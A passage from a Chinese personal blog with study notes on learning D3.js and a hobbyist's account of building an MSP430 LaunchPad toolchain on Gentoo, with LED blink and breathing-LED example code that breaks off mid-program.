    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>这几天，嗯，跟着<a href="https://www.dashingd3js.com/" target="_blank" rel="external">Dashing D3.js</a>把传说中的D3.js入了个门。</p>
<p>D3在创建基于浏览器的动态数据可视化并带交互真是方便。</p>
<h2 id="从一无所知到数据绑定">从一无所知到数据绑定</h2><h3 id="为何数据可视化">为何数据可视化</h3><ul>
<li>一图胜千言，图形是直观的。</li>
<li>图形是简洁明了的表达方式</li>
<li>世界的数据量是巨大的，图形是好的分析和展示方式</li>
<li>数据是新的石油</li>
</ul>
<h3 id="为何选择D3-js">为何选择D3.js</h3><ul>
<li>D3.js 是基于数据操作文档的JavaScript库。D3帮助你使用HTML，SVG和CSS生动地展现数据。D3不需要你使用某个特定的框架，它的重点在于对主流浏览器的兼容，同时结合了强大的虚拟化组件，以数据驱动的方式去操作DOM。</li>
<li>D3.js由Mike Bostock基于他在斯坦福可视化小组的工作开发，现由其所在的纽约时报赞助。很多贡献者参与到项目的开发，你可以在github上找到这个项目。</li>
<li>D3.js是指Data Driven Documents。当你的网页想要和数据进行交互时，D3是个好的选择。</li>
<li>D3.js被应用到web应用的前端，即用户交互部分。</li>
</ul>
<h3 id="数据可视化流程">数据可视化流程</h3><p>Ben Fry数据可视化流程：</p>
<ul>
<li>获取</li>
<li>解析</li>
<li>过滤</li>
<li>挖掘</li>
<li>呈现</li>
<li>提炼</li>
<li>交互</li>
</ul>
<h3 id="基本构建模块">基本构建模块</h3><ul>
<li>现代浏览器</li>
<li>HTML</li>
<li>CSS</li>
<li>Javascript</li>
<li>DOM</li>
<li>SVG</li>
<li>Web Inspector</li>
</ul>
<h3 id="D3第一步">D3第一步</h3><ul>
<li>在HTML文件中引用云端或本地js库</li>
<li>在Web Inspector控制台中测试</li>
</ul>
<h3 id="添加DOM元素">添加DOM元素</h3><ul>
<li><code>select</code></li>
<li><code>append</code></li>
</ul>
<h3 id="添加SVG元素">添加SVG元素</h3><ul>
<li>js的分行特性</li>
<li><code>style</code>操作符</li>
<li>链式语法</li>
<li><code>select</code>可以被保存赋值</li>
</ul>
<h3 id="将数据绑定到DOM元素上">将数据绑定到DOM元素上</h3><ul>
<li><code>selectAll</code></li>
<li><code>data</code>操作符</li>
<li>虚选择–<a href="http://bost.ocks.org/mike/join/" target="_blank" rel="external">Thinking with Joins</a></li>
<li><code>enter</code>/<code>exit</code>/update</li>
<li>对虚选择的<code>append</code></li>
<li><code>text</code>操作符</li>
<li>数据在<code>__data__</code>属性中</li>
</ul>
<h3 id="使用在DOM元素中的数据">使用在DOM元素中的数据</h3><ul>
<li>向D3.js操作符参数传递函数，</li>
<li>函数第一个参数是<code>__data__</code>内容。</li>
</ul>
<h2 id="使用数据来可视化">使用数据来可视化</h2><h3 id="基于数据创建SVG元素">基于数据创建SVG元素</h3><ul>
<li>创建SVG容器</li>
<li>创建形状元素，比如<code>circle</code></li>
<li>将数据绑定到形状元素(基本靠虚选择完成)</li>
<li>使用<code>style</code>利用数据修饰SVG元素</li>
</ul>
<h3 id="使用SVG坐标空间">使用SVG坐标空间</h3><ul>
<li><p>一图胜千言：</p>
<p>  ———————-&gt; x<br>  | o<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  |<br>  v y</p>
</li>
<li><p><code>append(&#39;svg&#39;)</code>作为坐标空间</p>
</li>
<li>在SVG坐标空间内放置SVG元素。<code>attr</code></li>
<li>创建SVG元素放置SVG元素</li>
<li>将数据绑定到SVG元素上</li>
<li>利用绑定的数据改变SVG元素的位置</li>
<li>使用绑定的数据修饰SVG元素</li>
</ul>
<h3 id="D3-js接受的数据结构">D3.js接受的数据结构</h3><ul>
<li><code>select</code>到的是数组</li>
<li>D3可以加载外部资源，好多种类</li>
<li>JSON(key一定是字符串)</li>
<li>JSON数组</li>
</ul>
<h3 id="使用D3-js简化代码">使用D3.js简化代码</h3><ul>
<li>将JSON对象绑定到<code>__data__</code>属性上</li>
<li>使用绑定的JSON对象变更SVG元素</li>
</ul>
<h3 id="SVG基本形和D3-js">SVG基本形和D3.js</h3><p>流程固定，设置svg容器，绑定数据，append形状元素，设置必要属性和样式。</p>
<ul>
<li>circle</li>
<li>rect</li>
<li>ellipse</li>
<li>line</li>
<li>polyline/polygon</li>
</ul>
<h3 id="SVG_Path和D3-js">SVG Path和D3.js</h3><ul>
<li>一个用来画画的SVG内置语言</li>
<li>使用D3.js生成形状元素绘制程序(D3.js Path 数据生成器)</li>
</ul>
<h3 id="动态SVG坐标空间">动态SVG坐标空间</h3><p>论如何通过遍历所有数据找到图像边界。</p>
<h3 id="D3-js缩放">D3.js缩放</h3><p>将某个Domain映射到一个Range上的对象/类/函数。</p>
<ul>
<li><code>d3.scale.linear.domain([1,100]).range([0,1])</code></li>
<li><code>d3.max</code></li>
<li><code>d3.min</code></li>
<li>还有些其它量化的和非量化的缩放。</li>
</ul>
<h3 id="SVG_Group元素和D3-js">SVG Group元素和D3.js</h3><ul>
<li>可嵌套的<code>&lt;g&gt;</code>用来分组</li>
<li><code>transform</code>属性和从右到左执行各种tranforming(matrix/translate/scale/skewX/skewY)</li>
<li>transform的转换是相对空间坐标的转换</li>
<li>使用D3.js来分组SVG元素(<code>append</code>)</li>
<li>使用D3.js来转换SVG元素(<code>attr</code>)</li>
</ul>
<h3 id="SVG_Text_元素">SVG Text 元素</h3><ul>
<li><code>text</code>标签及属性, 比如<code>text-anchor</code>属性</li>
<li>使用D3.js创建Text元素，绑定数据，使用数据。</li>
</ul>
<h3 id="SVG坐标轴元素">SVG坐标轴元素</h3><ul>
<li>D3的坐标轴组件，包括水平与竖直坐标轴线、刻度、合适的分隔空间等等。</li>
<li>坐标轴可以更清晰展现变量大小和关系</li>
<li>坐标轴的范围，是否反转、类型、单位等</li>
<li>生成D3.js坐标轴函数(<code>d3.svg.axis().scale($SCALE)</code>)</li>
<li>调用坐标轴函数(<code>var xAxisGroup = svgContainer.append(&quot;g&quot;).call($FUNCTION);</code>)生成坐标轴元素组。</li>
<li>最后创建坐标轴(最上层)</li>
</ul>
<p>然后忽然没了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p>
<p>准备继续看<a href="http://alignedleft.com/tutorials/d3/" target="_blank" rel="external">Scott Murray的D3.js教程</a></p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/microcontroller/2014/05/10/gentoolaunchpad-msp430/" itemprop="url">
                  在Gentoo下开发Launchpad MSP430程序
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-05-10T00:00:00+08:00" content="2014-05-10">
              2014-05-10
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/microcontroller/" itemprop="url" rel="index">
                    <span itemprop="name">microcontroller</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/microcontroller/2014/05/10/gentoolaunchpad-msp430/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="microcontroller/2014/05/10/gentoolaunchpad-msp430/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>同学给我了片申请到的MSP-EXP430G2单片机玩。</p>
<p>从来没有玩过单片机，虽然本科专业还开设了一门叫做单片机的课程，课上完了我也没见到单片机是什么样的，当然，我也没去过几次。研究生阶段选修了一门嵌入式系统设计的课程，只记的老师拿着ppt讲的吐沫星子飞起，似乎ppt上有图，最后却还是没注意单片机是什么样的。</p>
<p>几天前第一次在工地上见到了单片机，一个同学在树莓派的基础上不停假设外设，当时他去采购了一大批物资其中就有一小块单片机。当时一个师兄拿着给我说：这个是单片机。我第一次知道，噢～原来这就是单片机。</p>
<p>没想到几天后一个做硬件的同学给了我块开发板。</p>
<p>同学说：我这里有CCS，但是实验室的正版软件，没法装到其它机器上。你可能没法玩。</p>
<p>我：没事，上学期上嵌入式的课老师给拷过CCS……</p>
<p>同学：！！！！那给你玩吧……</p>
<p>于是在回来在Ti的wiki上被科普了一把，想要使用msp430单片机可以用TI提供的两种IDE，iar和ccs。</p>
<p>ccs提供免费版本，限制16k程序，使用需要遵循美国政府blabla进出口管理条例法律，特别麻烦，不过注册申请后两小时就批准了。</p>
<p>win下的同学还可以去使用iar，同样免费版本限制十六kb程序，我特马第一个程序还不到200字节。我之所以下载ccs，因为ccs有linux版本</p>
<p>但是……我装不上……原因就不说了,各种依赖问题，我本来也不倾向使用IDE。</p>
<p>还有一套开源的东西可以用来开发，gcc/gdb/一堆binutils和c库+mspdebug，自由无限制，不需要注册，没有程序大小限制，开放可信赖，还是熟悉的工具集。</p>
<h2 id="在gentoo上设置开发环境">在gentoo上设置开发环境</h2><blockquote>
<p>Generating a cross-compiler by hand is a long and painful process. This is why it has been fully integrated into Gentoo!</p>
</blockquote>
<p>gentoo下的交叉编译似乎特别容易= =，因为crossdev的存在。</p>
<p>不要问我怎么设置：看这里 <a href="http://www.gentoo.org/proj/en/base/embedded/handbook/cross-compiler.xml?style=printable" target="_blank" rel="external">cross-compiler</a></p>
<p>我之前似乎在linux下写win32程序时把东西都搞好了……不记得当时做了什么，大概就是</p>
<pre><code><span class="title">emerge</span> crossdev
</code></pre><p>紧接着就可以生成msp430平台的系列工具了，我们要指定target、需要gdb等等……</p>
<p>sudo crossdev -S –ov-output /usr/portage/ –ex-gdb -t msp430</p>
<p>经过不那么漫长的等待，你会发现msp430一整套toolchain都已经搭好了。</p>
<p>让我们写个程序吧，LED闪灯小程序 main.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;msp430g2553.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">     <span class="keyword">volatile</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Stop watchdog timer */</span></span><br><span class="line">     WDTCTL = WDTPW | WDTHOLD;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Setup bit 0 of P1 and bit 6 of P1 as output */</span></span><br><span class="line">     P1DIR = <span class="number">0x41</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Setup bit 0 of P1 to 0 and bit 6 of P1 to 1*/</span></span><br><span class="line">     P1OUT = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Loop forever */</span></span><br><span class="line">     <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">         <span class="comment">/* Toggle bit 0,6 of P1 */</span></span><br><span class="line">         P1OUT ^= <span class="number">0x41</span>;</span><br><span class="line">         <span class="comment">/* Just delay */</span></span><br><span class="line">         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x9000</span>; i++)&#123;&#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实我都是抱着试试看的心理一边改别人的程序一边试的，单片机上确实写的是</p>
<pre><code>MSP<span class="number">430G2553</span>
</code></pre><p>然后编译，编译时要指定芯片，不要问我为什么，msp430-gcc就是这个德性</p>
<pre><code>msp430-gcc -mmcu=msp430g2553 -g main<span class="class">.c</span> -o main.elf
</code></pre><p>最后写进单片机吧。其实板子预先内置的就是这个程序。你可以把它改成只闪一个灯的。</p>
<p>我们要先安装mspdebug。</p>
<blockquote>
<p>MSPDebug is a free debugger for use with MSP430 MCUs</p>
</blockquote>
<pre><code>sudo emerge <span class="comment">--autounmask-write mspdebug</span>
sudo <span class="built_in">dispatch</span>-conf
sudo emerge mspdebug
</code></pre><p>然后指定驱动，至于这个驱动是调试接口的驱动，详情参考<a href="http://www.ti.com.cn/cn/lit/ug/zhcu025e/zhcu025e.pdf" target="_blank" rel="external">这里</a></p>
<pre><code><span class="title">sudo</span> mspdebug rf2500
</code></pre><p>接触读写硬件的权限是必要的。</p>
<pre><code>  ~/Work/msp430 $ sudo mspdebug rf2500                              
MSPDebug version <span class="number">0.22</span> - debugging tool <span class="keyword">for</span> MSP430 MCUs
Copyright (C) <span class="number">2009</span>-<span class="number">2013</span> Daniel Beer &lt;dlbeer@gmail.com&gt;
This <span class="keyword">is</span> free software; see the source <span class="keyword">for</span> copying conditions.  There <span class="keyword">is</span> NO
warranty; <span class="keyword">not</span> even <span class="keyword">for</span> MERCHANTABILITY <span class="keyword">or</span> FITNESS <span class="keyword">FOR</span> A PARTICULAR PURPOSE.

Trying <span class="keyword">to</span> open <span class="keyword">interface</span> <span class="number">1</span> <span class="keyword">on</span> <span class="number">007</span>
rf2500: warning: can<span class="comment">'t detach kernel driver: No such file or directory</span>
Initializing FET...
FET protocol version <span class="keyword">is</span> <span class="number">30394216</span>
<span class="keyword">Set</span> Vcc: <span class="number">3000</span> mV
Configured <span class="keyword">for</span> Spy-Bi-Wire
fet: FET returned <span class="keyword">error</span> code <span class="number">4</span> (Could <span class="keyword">not</span> find device <span class="keyword">or</span> device <span class="keyword">not</span> supported)
fet: command C_IDENT1 failed
<span class="keyword">Using</span> Olimex identification procedure
Device ID: <span class="number">0x2553</span>
   Code start address: <span class="number">0xc000</span>
   Code size         : <span class="number">16384</span> <span class="built_in">byte</span> = <span class="number">16</span> kb
   RAM  start address: <span class="number">0x200</span>
   RAM  <span class="keyword">end</span>   address: <span class="number">0x3ff</span>
   RAM  size         : <span class="number">512</span> <span class="built_in">byte</span> = <span class="number">0</span> kb
Device: MSP430G2xx3
Number <span class="keyword">of</span> breakpoints: <span class="number">2</span>
fet: FET returned NAK
warning: device does <span class="keyword">not</span> support power profiling
Chip ID data: <span class="number">25</span> <span class="number">53</span>

Available commands:
     =           <span class="keyword">erase</span>       isearch     power       save_raw    simio        
     <span class="keyword">alias</span>       <span class="keyword">exit</span>        load        prog        <span class="keyword">set</span>         <span class="keyword">step</span>        
     break       fill        load_raw    read        setbreak    sym          
     cgraph      gdb         md          regs        setwatch    verify      
     delbreak    help        mw          reset       setwatch_r  verify_raw  
     dis         hexout      opt         run         setwatch_w  

Available options:
     color                       gdb_loop                    
     enable_bsl_access           gdbc_xfer_size              
     enable_locked_flash_access  iradix                      
     fet_block_size              quiet                        
     gdb_default_port            

Type <span class="string">"help &lt;topic&gt;"</span> <span class="keyword">for</span> more information.
Use the <span class="string">"opt"</span> command (<span class="string">"help opt"</span>) <span class="keyword">to</span> <span class="keyword">set</span> options.
Press Ctrl+D <span class="keyword">to</span> quit.

(mspdebug)  
</code></pre><p>接着输入</p>
<pre><code><span class="tag">prog</span> <span class="tag">main</span><span class="class">.elf</span>
</code></pre><p>就把程序烧进……不知道什么东西去了。当年嵌入式的课白听了，就记的几个名词……</p>
<pre><code>(mspdebug) prog main.elf
Erasing...
Programming...
Writing  <span class="number">148</span> <span class="keyword">bytes</span> <span class="keyword">at</span> c000 [section: .<span class="keyword">text</span>]...
Writing   <span class="number">32</span> <span class="keyword">bytes</span> <span class="keyword">at</span> ffe0 [section: .vectors]...
Done, <span class="number">180</span> <span class="keyword">bytes</span> total
</code></pre><p>接着run就可以看灯轮流闪了</p>
<pre><code>(mspdebug) <span class="command">run</span>
Running. Press Ctrl+C <span class="keyword">to</span> interrupt...
</code></pre><p>如果要调试，直接输入gdb就可以，</p>
<pre><code>(mspdebug) gdb
Bound <span class="keyword">to</span> port <span class="number">2000.</span> <span class="built_in">Now</span> waiting <span class="keyword">for</span> connection...
</code></pre><p>在另一个终端：</p>
<pre><code>  ~/Work/msp430 ? msp430-gdb -q
(gdb) target remote localhost:<span class="number">2000</span>
Remote debugging <span class="keyword">using</span> localhost:<span class="number">2000</span>
<span class="number">0x0000c076</span> <span class="operator">in</span> ?? ()
(gdb) <span class="built_in">file</span> main.elf
A program is being debugged already.
Are you sure you want <span class="built_in">to</span> change <span class="operator">the</span> <span class="built_in">file</span>? (y <span class="operator">or</span> n) y
Reading symbols <span class="built_in">from</span> /home/lyy/Work/msp430/main.elf...done.
(gdb) n
</code></pre><p>接着还能用makefile简化这些过程，但，我不会makefile……</p>
<h2 id="last_but_not_least">last but not least</h2><p>这套工具链可以在其它linux如debian上很容易的搭建起来，就几个apt-get的事，虽然还没在debian下试过，但debian质量，值得信赖。</p>
<p>在windows下也可以使用这一整套工具，相比ccs来说具有……好处开头说了，支持也不错。</p>
<p>参考文献，不一一标注引用，还有好多忘了:</p>
<ul>
<li><a href="http://coldnew.github.io/blog/2013/11/18_686_g.html" target="_blank" rel="external">http://coldnew.github.io/blog/2013/11/18_686_g.html</a></li>
<li><a href="http://processors.wiki.ti.com/index.php/Download_CCS" target="_blank" rel="external">http://processors.wiki.ti.com/index.php/Download_CCS</a></li>
<li><a href="http://www.ti.com.cn/cn/lit/ug/zhcu010c/zhcu010c.pdf" target="_blank" rel="external">http://www.ti.com.cn/cn/lit/ug/zhcu010c/zhcu010c.pdf</a></li>
<li><a href="http://home.eeworld.com.cn/my/space-uid-139222-blogid-72202.html" target="_blank" rel="external">http://home.eeworld.com.cn/my/space-uid-139222-blogid-72202.html</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_a47d75c60101axsp.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_a47d75c60101axsp.html</a></li>
<li><a href="http://develissimo.com/forum/topic/115418/" target="_blank" rel="external">http://develissimo.com/forum/topic/115418/</a></li>
<li><a href="http://processors.wiki.ti.com/index.php/Blink_your_first_LED" target="_blank" rel="external">http://processors.wiki.ti.com/index.php/Blink_your_first_LED</a></li>
<li><a href="http://43oh.com/2010/08/10-beginner-msp430-tutorials-and-counting/" target="_blank" rel="external">http://43oh.com/2010/08/10-beginner-msp430-tutorials-and-counting/</a></li>
</ul>
<p>哈，第一次玩硬件……向赞助我片子的同学汇报时同学说你怎么进展这么快！！！！</p>
<p>只来得及玩了一天就陷入加班写文档的狂潮之中去了……摔！！！</p>
<p>最后附上个呼吸灯程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Original code is here, //http://osx-launchpad.blogspot.com/2010/11/breathing-led-effect-with-launchpad.html</span></span><br><span class="line"><span class="comment">//This is slight modification to work with Ti CCS devtool</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span>  <span class="string">&lt;msp430.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;   <span class="comment">// Index to PWM's duty cycle table (= brightness)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> curve[] = &#123;</span><br><span class="line">    <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">1</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">    <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,     <span class="number">3</span>,</span><br><span class="line">    <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">4</span>,     <span class="number">5</span>,     <span class="number">5</span>,     <span class="number">5</span>,</span><br><span class="line">    <span class="number">5</span>,     <span class="number">6</span>,     <span class="number">6</span>,     <span class="number">6</span>,     <span class="number">6</span>,     <span class="number">7</span>,     <span class="number">7</span>,     <span class="number">7</span>,</span><br><span class="line">    <span class="number">8</span>,     <span class="number">8</span>,     <span class="number">8</span>,     <span class="number">8</span>,     <span class="number">9</span>,     <span class="number">9</span>,     <span class="number">9</span>,    <span class="number">10</span>,</span><br><span class="line">   <span class="number">10</span>,    <span class="number">10</span>,    <span class="number">11</span>,    <span class="number">11</span>,    <span class="number">11</span>,    <span class="number">12</span>,    <span class="number">12</span>,    <span class="number">13</span>,</span><br><span class="line">   <span class="number">13</span>,    <span class="number">13</span>,    <span class="number">14</span>,    <span class="number">14</span>,    <span class="number">15</span>,    <span class="number">15</span>,    <span class="number">15</span>,    <span class="number">16</span>,</span><br><span class="line">   <span class="number">16</span>,    <span class="number">17</span>,    <span class="number">17</span>,    <span class="number">18</span>,    <span class="number">18</span>,    <span class="number">18</span>,    <span class="number">19</span>,    <span class="number">19</span>,</span><br><span class="line">   <span class="number">20</span>,    <span class="number">20</span>,    <span class="number">21</span>,    <span class="number">21</span>,    <span class="number">22</span>,    <span class="number">22</span>,    <span class="number">23</span>,    <span class="number">23</span>,</span><br><span class="line">   <span class="number">24</span>,    <span class="number">24</span>,    <span class="number">25</span>,    <span class="number">25</span>,    <span class="number">26</span>,    <span class="number">26</span>,    <span class="number">27</span>,    <span class="number">27</span>,</span><br><span class="line">   <span class="number">28</span>,    <span class="number">29</span>,    <span class="number">29</span>,    <span class="number">30</span>,    <span class="number">30</span>,    <span class="number">31</span>,    <span class="number">31</span>,    <span class="number">32</span>,</span><br><span class="line">   <span class="number">33</span>,    <span class="number">33</span>,    <span class="number">34</span>,    <span class="number">34</span>,    <span class="number">35</span>,    <span class="number">36</span>,    <span class="number">36</span>,    <span class="number">37</span>,</span><br><span class="line">   <span class="number">38</span>,    <span class="number">38</span>,    <span class="number">39</span>,    <span class="number">39</span>,    <span class="number">40</span>,    <span class="number">41</span>,    <span class="number">41</span>,    <span class="number">42</span>,</span><br><span class="line">   <span class="number">43</span>,    <span class="number">43</span>,    <span class="number">44</span>,    <span class="number">45</span>,    <span class="number">46</span>,    <span class="number">46</span>,    <span class="number">47</span>,    <span class="number">48</span>,</span><br><span class="line">   <span class="number">48</span>,    <span class="number">49</span>,    <span class="number">50</span>,    <span class="number">50</span>,    <span class="number">51</span>,    <span class="number">52</span>,    <span class="number">53</span>,    <span class="number">53</span>,</span><br><span class="line">   <span class="number">54</span>,    <span class="number">55</span>,    <span class="number">56</span>,    <span class="number">56</span>,    <span class="number">57</span>,    <span class="number">58</span>,    <span class="number">59</span>,    <span class="number">59</span>,</span><br><span class="line">   <span class="number">60</span>,    <span class="number">61</span>,    <span class="number">62</span>,    <span class="number">62</span>,    <span class="number">63</span>,    <span class="number">64</span>,    <span class="number">65</span>,    <span class="number">66</span>,</span><br><span class="line">   <span class="number">66</span>,    <span class="number">67</span>,    <span class="number">68</span>,    <span class="number">69</span>,    <span class="number">70</span>,    <span class="number">70</span>,    <span class="number">71</span>,    <span class="number">72</span>,</span><br><span class="line">   <span class="number">73</span>,    <span class="number">74</span>,    <span class="number">75</span>,    <span class="number">75</span>,    <span class="number">76</span>,    <span class="number">77</span>,    <span class="number">78</span>,    <span class="number">79</span>,</span><br><span class="line">   <span class="number">80</span>,    <span class="number">80</span>,    <span class="number">81</span>,    <span class="number">82</span>,    <span class="number">83</span>,    <span class="number">84</span>,    <span class="number">85</span>,    <span class="number">86</span>,</span><br><span class="line">   <span class="number">87</span>,    <span class="number">87</span>,    <span class="number">88</span>,    <span class="number">89</span>,    <span class="number">90</span>,    <span class="number">91</span>,    <span class="number">92</span>,    <span class="number">93</span>,</span><br><span class="line">   <span class="number">94</span>,    <span class="number">95</span>,    <span class="number">95</span>,    <span class="number">96</span>,    <span class="number">97</span>,    <span class="number">98</span>,    <span class="number">99</span>,   <span class="number">100</span>,</span><br><span class="line">  <span class="number">101</span>,   <span class="number">102</span>,   <span class="number">103</span>,   <span class="number">104</span>,   <span class="number">105</span>,   <span class="number">106</span>,   <span class="number">106</span>,   <span class="number">107</span>,</span><br><span class="line">  <span class="number">108</span>,   <span class="number">109</span>,   <span class="number">110</span>,   <span class="number">111</span>,   <span class="number">112</span>,   <span class="number">113</span>,   <span class="number">114</span>,   <span class="number">115</span>,</span><br><span class="line">  <span class="number">116</span>,   <span class="number">117</span>,   <span class="number">118</span>,   <span class="number">119</span>,   <span class="number">120</span>,   <span class="number">121</span>,   <span class="number">122</span>,   <span class="number">122</span>,</span><br><span class="line">  <span class="number">123</span>,   <span class="number">124</span>,   <span class="number">125</span>,   <span class="number">126</span>,   <span class="number">127</span>,   <span class="number">128</span>,   <span class="number">129</span>,   <span class="number">130</span>,</span><br><span class="line">  <span class="number">131</span>,   <span class="number">132</span>,   <span class="number">133</span>,   <span class="number">134</span>,   <span class="number">135</span>,   <span class="number">136</span>,   <span class="number">137</span>,   <span class="number">138</span>,</span><br><span class="line">  <span class="number">139</span>,   <span class="number">140</span>,   <span class="number">141</span>,   <span class="number">142</span>,   <span class="number">143</span>,   <span class="number">144</span>,   <span class="number">145</span>,   <span class="number">146</span>,</span><br><span class="line">  <span class="number">147</span>,   <span class="number">148</span>,   <span class="number">149</span>,   <span class="number">150</span>,   <span class="number">151</span>,   <span class="number">152</span>,   <span class="number">153</span>,   <span class="number">154</span>,</span><br><span class="line">  <span class="number">155</span>,   <span class="number">156</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="comment">// Stop watchdog</span></span><br><span class="line">  WDTCTL = WDTPW + WDTHOLD;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set clock to 1 MHz</span></span><br><span class="line">  DCOCTL= <span class="number">0</span>;</span><br><span class="line">  BCSCTL1= CALBC1_1MHZ;</span><br><span class="line">  DCOCTL= CALDCO_1MHZ;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// SMCLK = 1 MHz / 8 = 125 KHz (SLAU144E p.5-15)</span></span><br><span class="line">  BCSCTL2 |= DIVS_3;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Make P1.6 (green led) an output. SLAU144E p.8-3</span></span><br><span class="line">  P1DIR |= BIT6;</span><br><span class="line"></span><br><span 